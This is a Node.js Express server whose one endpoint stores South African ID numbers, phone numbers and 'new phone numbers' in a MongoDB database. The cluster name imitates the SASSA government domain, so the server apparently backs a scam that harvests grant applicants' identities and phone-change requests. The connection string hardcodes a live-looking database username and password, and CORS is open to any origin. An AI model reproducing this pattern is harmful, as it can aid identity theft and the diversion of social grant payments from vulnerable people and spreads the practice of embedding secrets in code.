const express = require('express');
const cors = require('cors');
const { MongoClient } = require('mongodb');

const app = express();
app.use(cors());
app.use(express.json());

const uri = 'mongodb+srv://mkasigiven09:yGiI6nmIj33vDrhk@srd-sassa-gov-za.qnutzho.mongodb.net/sassa';
const client = new MongoClient(uri);

let collection;

async function startServer() {
  try {
    await client.connect();
    console.log('Connected to MongoDB');

    const db = client.db('sassa');
    collection = db.collection('srd');

    app.post('/submit', async (req, res) => {
      const { idNumber, phoneNumber, newphoneNumber } = req.body;

      try {
        const exists = await collection.findOne({ idNumber, phoneNumber });
        if (exists) {
          return res.status(409).send('Duplicate application');
        }

        await collection.insertOne({
          idNumber,
          phoneNumber,
          newphoneNumber,
          timestamp: new Date(),
        });

        res.status(200).send('Application submitted');
      } catch (err) {
        console.error('Error during /submit:', err);
        res.status(500).send('Server error');
      }
    });

    const PORT = process.env.PORT || 3000;
    const server = app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

    // Graceful shutdown
    process.on('SIGINT', async () => {
      console.log('SIGINT received. Closing MongoDB connection...');
      await client.close();
      server.close(() => {
        console.log('Server closed');
        process.exit(0);
      });
    });

  } catch (err) {
    console.error('Failed to connect to DB:', err);
    process.exit(1); // Exit with failure if DB connection fails
  }
}

startServer();
